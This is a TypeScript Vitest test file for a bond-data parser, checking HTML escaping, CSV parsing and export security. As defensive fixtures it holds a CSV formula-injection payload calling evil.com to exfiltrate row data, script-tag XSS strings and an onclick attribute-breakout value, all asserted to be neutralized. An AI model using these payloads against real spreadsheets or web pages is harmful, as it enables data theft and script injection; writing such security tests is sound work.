import { describe, it, expect } from 'vitest';
import {
  parseBondsFromHTML,
  parseBondsFromCSV,
  parseCSVLine,
  generateTreasuryHTML,
  generateCSV,
  escapeHTML,
  unescapeHTML,
  neutralizeCSVFormula,
  CURRENT_REFERENCE_DATE,
} from './bondParser';
import type { Bond } from '../types';

// One canonical fixture used by every round-trip spec. Driven by the
// spec input only; all other fields intentionally harmless so a
// failing assertion points at the round-trip logic, not at noise.
function bondWith(note: string, serial = 'R123456789I'): Bond {
  return {
    serial,
    series: 'I',
    denomination: 100,
    issueDate: '07/2010',
    nextAccrual: '08/2026',
    finalMaturity: '07/2040',
    issuePrice: 100,
    interest: 50,
    interestRate: 3.5,
    value: 150,
    note,
  };
}

// All five HTML-sensitive characters that escapeHTML handles — used as
// a self-documenting sample in the round-trip specs. Template literal
// is unambiguous: `` `<>"&'` `` is literally the 5 chars <, >, ", &, '
// (no escapes, no mixed quote styles).
const ALL_FIVE = `<>"&'`;

describe('escapeHTML (security helper)', () => {
  it('escapes a <script> tag into inert text', () => {
    expect(escapeHTML('<script>x</script>')).toBe(
      '&lt;script&gt;x&lt;/script&gt;',
    );
  });

  it('escapes each of the five HTML-sensitive characters individually', () => {
    expect(escapeHTML('&')).toBe('&amp;');
    expect(escapeHTML('<')).toBe('&lt;');
    expect(escapeHTML('>')).toBe('&gt;');
    expect(escapeHTML('"')).toBe('&quot;');
    expect(escapeHTML("'")).toBe('&#39;');
  });

  it('escapes a string with every sensitive char at once', () => {
    expect(escapeHTML(ALL_FIVE)).toBe('&lt;&gt;&quot;&amp;&#39;');
  });

  // Order matters: replace `&` FIRST, otherwise already-escaped
  // entities balloon. If someone later swapped the order in
  // escapeHTML, the assertions below (which use the LITERAL
  // expected escape, not any helper) would catch the regression.
  it('does not double-escape already-escaped entities (replaces & first)', () => {
    expect(escapeHTML('&amp;')).toBe('&amp;amp;');
    expect(escapeHTML('&lt;')).toBe('&amp;lt;');
    expect(escapeHTML('&quot;')).toBe('&amp;quot;');
  });

  it('passes empty strings and plain text through unchanged', () => {
    expect(escapeHTML('')).toBe('');
    expect(escapeHTML('hello world')).toBe('hello world');
  });

  it('coerces non-string scalars to a string before escaping', () => {
    // Numeric cells are HTML-safe by construction, but the helper
    // still works — String(100) = '100', no chars to escape.
    expect(escapeHTML(100)).toBe('100');
    expect(escapeHTML(0)).toBe('0');
    expect(escapeHTML(123.45)).toBe('123.45');
  });
});

describe('unescapeHTML (security helper)', () => {
  it('decodes the five canonical entities back to their raw characters', () => {
    expect(unescapeHTML('&lt;')).toBe('<');
    expect(unescapeHTML('&gt;')).toBe('>');
    expect(unescapeHTML('&quot;')).toBe('"');
    expect(unescapeHTML('&#39;')).toBe("'");
    expect(unescapeHTML('&amp;')).toBe('&');
  });

  // The matching ordering trap: if `&amp;` runs first, the encoded
  // sequence `&amp;lt;` would collapse to a bare `<` (because the
  // first pass decodes `&amp;` to `&`, the second pass then finds a
  // fresh `&lt;` and decodes again). The safe order decodes every
  // other entity first, then `&amp;` LAST, so `&amp;lt;` stays as
  // the literal four chars `&lt;`.
  it('decodes &amp; LAST so "&amp;lt;" becomes "&lt;" (not bare "<")', () => {
    expect(unescapeHTML('&amp;lt;')).toBe('&lt;');
    expect(unescapeHTML('&amp;quot;')).toBe('&quot;');
  });

  it('round-trips escape -> unescape for any input containing < > & " \'', () => {
    const samples = [
      '<tag>',
      'A & B',
      'she said "hi"',
      "it's fine",
      ALL_FIVE,
      'mixed: <a href="x">y & z</a>',
      '', // empty string round-trip
    ];
    for (const s of samples) {
      expect(unescapeHTML(escapeHTML(s))).toBe(s);
    }
  });
});

describe('neutralizeCSVFormula (security helper)', () => {
  // The OWASP trigger set: '=' triggers formula evaluation, '+'/'-'
  // trigger numeric coercion, '@' is an Excel function-call prefix,
  // and TAB/CR are sometimes interpreted as cell separators.
  it.each(['=', '+', '-', '@', '\t', '\r'])(
    'prefixes a single quote when value starts with "%s"',
    (trigger) => {
      expect(neutralizeCSVFormula(`${trigger}cmd`)).toBe(`'${trigger}cmd`);
    },
  );

  it('leaves values without a formula-trigger prefix unchanged', () => {
    expect(neutralizeCSVFormula('plain text')).toBe('plain text');
    expect(neutralizeCSVFormula('123.45')).toBe('123.45');
    expect(neutralizeCSVFormula('C827&41069EE')).toBe('C827&41069EE');
    expect(neutralizeCSVFormula('')).toBe('');
  });

  it('only matches at the START (mid-string = is safe)', () => {
    expect(neutralizeCSVFormula('cmd =A1+2')).toBe('cmd =A1+2');
    expect(neutralizeCSVFormula('total=42')).toBe('total=42');
  });

  it('handles the canonical OWASP exfiltration payload', () => {
    // Without neutralize, opening the CSV in Excel becomes a one-click
    // exfiltration: clicking "Click me" sends current-row data to evil.com.
    const attempt =
      '=HYPERLINK("https://evil.com/?exfil","Click me")';
    expect(neutralizeCSVFormula(attempt)).toBe(`'${attempt}`);
  });
});

// RFC-4180 single-line CSV parser. Used by parseBondsFromCSV via
// per-line split (multi-line quoted fields are out of scope — see
// the docstring on parseCSVLine).
describe('parseCSVLine (RFC-4180 quote escape)', () => {
  // Direct regression spec for the bug documented in the (now-
  // retired) FIXME block in this file. The OLD toggle-based parser
  // produced ['a', 'b'] here — it treated each `"` as a quote-modifier
  // rather than as an escaped `"`.
  it('treats `""` inside a quoted field as a single literal `"`', () => {
    expect(parseCSVLine('"a""b"')).toEqual(['a"b']);
  });

  it('handles a cell with multiple consecutive escapes', () => {
    expect(parseCSVLine('"a""b""c"')).toEqual(['a"b"c']);
  });

  it('handles empty quoted fields', () => {
    expect(parseCSVLine('""')).toEqual(['']);
    expect(parseCSVLine('"",1,""')).toEqual(['', '1', '']);
  });

  it('mixes bare and quoted cells correctly', () => {
    expect(parseCSVLine('plain,123,"quoted","with""escape"')).toEqual([
      'plain',
      '123',
      'quoted',
      'with"escape',
    ]);
  });

  it('keeps cell delimiters (commas) inside quoted cells intact', () => {
    // A comma inside a quoted field is not a separator — that's the
    // whole point of quoting per RFC 4180.
    expect(parseCSVLine('"a,b","c"')).toEqual(['a,b', 'c']);
  });
});

describe('generateTreasuryHTML — HTML export security', () => {
  it('escapes a <script> note into inert text (no live tag)', () => {
    const html = generateTreasuryHTML([
      bondWith('<script>alert("pwned")</script>'),
    ]);
    // Belt-and-braces: literal "<script" must not appear ANYWHERE in
    // the file — the only allowed form is the entity-encoded
    // &lt;script&gt; the helper emitted.
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;');
  });

  it('escapes a value-attribute breakout attempt in `serial`', () => {
    const html = generateTreasuryHTML([
      bondWith('any', `" onclick="alert(1)`),
    ]);
    // The hostile literal must NOT appear verbatim inside any
    // attribute — the breakout is defused.
    expect(html).not.toMatch(/value="\s*"\s+onclick=/);
    expect(html).toContain('&quot; onclick=&quot;');
  });

  // Baseline for the 99% path: a plain ASCII note round-trips
  // byte-identical, no surprise double-decoding or whitespace drift.
  it('is idempotent for plain text (no-op baseline)', () => {
    const note = 'C827&41069EE';
    const html = generateTreasuryHTML([bondWith(note)]);
    expect(parseBondsFromHTML(html)[0].note).toBe(note);
  });

  // Litmus test for happy-dom's textContent entity-decoding path.
  // If happy-dom ever regresses and stops decoding entities in
  // textContent, EVERY round-trip spec in this file starts failing —
  // this spec isolates just that one char so a CI failure points
  // straight at the DOM environment.
  it('round-trips a literal "&" through entity-decode (happy-dom smoke test)', () => {
    const html = generateTreasuryHTML([bondWith('&')]);
    expect(parseBondsFromHTML(html)[0].note).toBe('&');
  });

  it('round-trips with parseBondsFromHTML: notes with HTML-special chars come back identical', () => {
    const notes = [
      '<script>x</script>',
      'A & B',
      'she said "hi"',
      "it's fine",
      ALL_FIVE,
      'mixed: <a href="x">y & z</a>',
      '', // empty-string round-trip
    ];
    for (const note of notes) {
      const html = generateTreasuryHTML([bondWith(note)]);
      const reparsed = parseBondsFromHTML(html);
      expect(reparsed.length).toBe(1);
      expect(reparsed[0].note).toBe(note);
    }
  });

  it('round-trips serials containing HTML-special chars', () => {
    const html = generateTreasuryHTML([bondWith('any', 'C827&41069EE')]);
    const reparsed = parseBondsFromHTML(html);
    expect(reparsed[0].serial).toBe('C827&41069EE');
  });
});

describe('generateCSV — CSV export security', () => {
  it('neutralizes a hostile =HYPERLINK formula note', () => {
    const csv = generateCSV([
      bondWith('=HYPERLINK("https://evil.com/?exfil","Click")'),
    ]);
    // Quote-then-'=' prefix prevents Excel/LibreOffice/Numbers from
    // evaluating the formula on open.
    expect(csv).toContain(`"'=HYPERLINK`);
    // Belt-and-braces: no bare-leading "=HYPERLINK" anywhere unquoted
    // in the CSV body.
    expect(csv).not.toMatch(/^[^"]*"=HYPERLINK/m);
  });

  it.each(['=', '+', '-', '@'])('neutralizes %s-prefixed notes', (trigger) => {
    const csv = generateCSV([bondWith(`${trigger}cmd`)]);
    expect(csv).toContain(`"'${trigger}cmd`);
  });

  it('round-trips with parseBondsFromCSV for HTML-special chars', () => {
    const notes = [
      '<script>x</script>',
      'A & B',
      "it's fine",
      '', // empty
    ];
    for (const note of notes) {
      const csv = generateCSV([bondWith(note)]);
      const reparsed = parseBondsFromCSV(csv);
      expect(reparsed.length).toBeGreaterThanOrEqual(1);
      expect(reparsed[reparsed.length - 1].note).toBe(note);
    }
  });

  // Forward-compat coverage for the parseCSVLine refactor: notes
  // containing literal `"` chars round-trip cleanly through
  // generateCSV -> parseBondsFromCSV. Would have failed before: the
  // OLD state machine couldn't distinguish `""` as escape from `""`
  // as toggles, so embedded `"` characters got silently corrupted.
  it('round-trips with parseBondsFromCSV when note contains embedded `"` chars', () => {
    const notes = [
      'she said "hi"',
      'a lone trailing quote: "',
      '""', // two literal quote chars in the data
    ];
    for (const note of notes) {
      const csv = generateCSV([bondWith(note)]);
      const reparsed = parseBondsFromCSV(csv);
      expect(reparsed.length).toBeGreaterThanOrEqual(1);
      expect(reparsed[reparsed.length - 1].note).toBe(note);
    }
  });
});

describe('CURRENT_REFERENCE_DATE (dashboard reference date)', () => {
  it('is exported and shaped for isBondMatured consumption', () => {
    expect(CURRENT_REFERENCE_DATE).toEqual({ year: 2026, month: 7 });
    expect(typeof CURRENT_REFERENCE_DATE.year).toBe('number');
    expect(typeof CURRENT_REFERENCE_DATE.month).toBe('number');
  });
});
